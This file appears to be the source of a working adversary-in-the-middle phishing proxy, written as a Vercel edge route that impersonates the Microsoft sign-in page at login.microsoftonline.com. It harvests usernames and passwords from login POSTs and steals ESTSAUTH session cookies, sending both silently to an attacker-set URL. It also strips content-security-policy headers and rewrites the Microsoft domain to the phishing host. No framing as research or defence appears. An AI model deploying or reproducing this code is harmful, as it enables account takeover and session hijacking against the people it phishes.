export const runtime = 'edge';

// Configuration
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = ''; // ← Fill this in if you want exfiltration to work
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// ---- Exfiltration Functions ----
async function sendCredsToVercel(data) {
  if (!VERCEL_URL) return;
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    // Intentionally silent
  }
}

async function exfiltrateCookiesFile(cookieText, ip) {
  if (!VERCEL_URL) return;
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    // Intentionally silent
  }
}

async function handleProxy(request, pathSegments = []) {
  const url = new URL(request.url);
  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  const url_hostname = url.hostname;
  const upstream_domain = UPSTREAM;

  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.host = upstream_domain;
  upstreamUrl.port = '';

  if (upstreamUrl.pathname === '/') {
    upstreamUrl.pathname = UPSTREAM_PATH;
  } else {
    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
  }

  console.log('Proxying to:', upstreamUrl.toString());

  const method = request.method;
  const new_request_headers = new Headers(request.headers);
  new_request_headers.set('Host', upstream_domain);
  new_request_headers.set('Referer', `https://${url_hostname}`);

  // Credential harvesting on POST
  if (method === 'POST') {
    try {
      const temp_req = request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split('&');
      let user, pass;

      for (const pair of keyValuePairs) {
        const [key, value] = pair.split('=');
        if (key === 'login') {
          user = decodeURIComponent((value || '').replace(/\+/g, ' '));
        }
        if (key === 'passwd') {
          pass = decodeURIComponent((value || '').replace(/\+/g, ' '));
        }
      }

      if (user && pass) {
        await sendCredsToVercel({ type: "creds", ip: ipAddress, user, pass });
      }
    } catch (error) {
      console.error('Credential parsing error:', error.message);
    }
  }

  // ==================== MAIN UPSTREAM FETCH WITH PROPER ERROR HANDLING ====================
  let original_response;
  try {
    original_response = await fetch(upstreamUrl.toString(), {
      method: method,
      headers: new_request_headers,
      body: ["GET", "HEAD"].includes(method) ? null : request.body,
      redirect: 'follow',
    });
  } catch (error) {
    // This is the main source of your previous "fetch failed" error
    console.error('Upstream fetch failed:', {
      url: upstreamUrl.toString(),
      method: method,
      errorName: error.name,
      errorMessage: error.message,
      cause: error.cause ? error.cause.message || error.cause : null,
      stack: error.stack
    });

    return new Response(
      JSON.stringify({
        error: 'Proxy Error',
        message: 'Failed to reach upstream server',
        details: error.message
      }),
      {
        status: 502, // Bad Gateway
        headers: { 'content-type': 'application/json' }
      }
    );
  }
  // =====================================================================================

  // Handle WebSocket upgrades
  const connection_upgrade = new_request_headers.get("Upgrade");
  if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
    return original_response;
  }

  // Clone for later reading
  const original_response_clone = original_response.clone();
  const response_headers = original_response.headers;
  const new_response_headers = new Headers(response_headers);
  const status = original_response.status;

  new_response_headers.set('access-control-allow-origin', '*');
  new_response_headers.set('access-control-allow-credentials', 'true');
  new_response_headers.delete('content-security-policy');
  new_response_headers.delete('content-security-policy-report-only');
  new_response_headers.delete('clear-site-data');

  // Cookie handling + exfiltration
  let all_cookies = "";
  try {
    const originalCookies = (typeof new_response_headers.getAll === "function")
      ? new_response_headers.getAll("Set-Cookie")
      : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);

    all_cookies = originalCookies.join("; \n\n");

    originalCookies.forEach(originalCookie => {
      const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
      new_response_headers.append("Set-Cookie", modifiedCookie);
    });
  } catch (error) {
    console.error('Cookie processing error:', error);
  }

  if (
    (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) ||
    all_cookies.includes('ESTSAUTHLIGHT')
  ) {
    await exfiltrateCookiesFile(all_cookies, ipAddress);
  }

  // Body handling
  const content_type = new_response_headers.get('content-type');
  let original_text;

  if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
    let text = await original_response_clone.text();
    text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
    original_text = text;
  } else {
    original_text = original_response_clone.body;
  }

  const response = new Response(original_text, {
    status,
    headers: new_response_headers
  });

  return response;
}

// Export handlers
export async function GET(request, { params }) { return handleProxy(request, params?.path || []); }
export async function POST(request, { params }) { return handleProxy(request, params?.path || []); }
export async function PUT(request, { params }) { return handleProxy(request, params?.path || []); }
export async function DELETE(request, { params }) { return handleProxy(request, params?.path || []); }
export async function PATCH(request, { params }) { return handleProxy(request, params?.path || []); }
export async function OPTIONS(request, { params }) { return handleProxy(request, params?.path || []); }
export async function HEAD(request, { params }) { return handleProxy(request, params?.path || []); }
